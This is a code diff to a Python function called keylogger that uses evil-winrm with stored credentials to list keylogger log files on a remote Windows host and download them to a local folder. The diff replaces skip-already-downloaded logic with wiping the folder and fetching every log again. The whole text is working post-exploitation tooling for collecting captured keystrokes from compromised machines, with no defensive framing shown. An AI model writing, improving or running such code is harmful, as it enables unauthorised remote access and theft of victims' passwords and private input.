@@ -145,15 +145,17 @@ def keylogger(target_ip):
 
     try:
         import os
+        import shutil
         
         LOCAL_DIR = f"./Box/keylogger_{target_ip}"
         
-        # Create local directory if it doesn't exist
-        if not os.path.exists(LOCAL_DIR):
-            os.makedirs(LOCAL_DIR)
+        # Clear old logs if they exist
+        if os.path.exists(LOCAL_DIR):
+            shutil.rmtree(LOCAL_DIR)
+        os.makedirs(LOCAL_DIR)
         
         # Get list of remote files
-        payload = f'Get-ChildItem "C:\\\\Users\\\\Public\\\\Logs" -Filter "*.log" | Select-Object -ExpandProperty FullName'
+        payload = f'Get-ChildItem "C:\\\\Users\\\\Public\\\\Logs" -Filter "*.log" | Select-Object -ExpandProperty Name'
         
         result = subprocess.run(
             ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
@@ -168,24 +170,14 @@ def keylogger(target_ip):
             print("[-] No log files found on remote system")
             return
         
-        print(f"[*] Found {len(remote_files)} log files on remote system")
+        print(f"[*] Found {len(remote_files)} log files. Downloading...")
         
-        # Get list of already downloaded files
-        local_files = set()
-        if os.path.exists(LOCAL_DIR):
-            local_files = {os.path.basename(f) for f in os.listdir(LOCAL_DIR) if f.endswith('.log')}
-        
-        # Download only new files
-        downloaded_count = 0
-        for remote_file in remote_files:
-            local_filename = os.path.basename(remote_file)
+        # Download all files
+        for filename in remote_files:
+            remote_path = f"C:\\Users\\Public\\Logs\\{filename}"
+            local_path = os.path.join(LOCAL_DIR, filename)
             
-            if local_filename in local_files:
-                print(f"[~] Already have {local_filename}, skipping...")
-                continue
-            
-            local_path = os.path.join(LOCAL_DIR, local_filename)
-            payload = f'download "{remote_file}" "{local_path}"'
+            payload = f'download "{remote_path}" "{local_path}"'
             
             subprocess.run(
                 ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
@@ -195,23 +187,9 @@ def keylogger(target_ip):
                 stderr=subprocess.DEVNULL
             )
             
-            time.sleep(1)  # give a moment for file to be written
-            
-            if os.path.exists(local_path):
-                print(f"[+] Downloaded {local_filename}")
-                downloaded_count += 1
-            else:
-                print(f"[-] Failed to download {local_filename}")
+            print(f"[+] Downloaded {filename}")
         
-        if downloaded_count == 0:
-            print("[*] All files already downloaded")
-        else:
-            print(f"[+] Downloaded {downloaded_count} new file(s) to {LOCAL_DIR}/")
-        
-        if downloaded_count == 0:
-            print("[*] All files already downloaded")
-        else:
-            print(f"[+] Downloaded {downloaded_count} new file(s) to {LOCAL_DIR}/")
+        print(f"[+] All logs saved to {LOCAL_DIR}/")
             
     except Exception as e:
         print(f"[-] Failed to download keylogger logs: {e}")
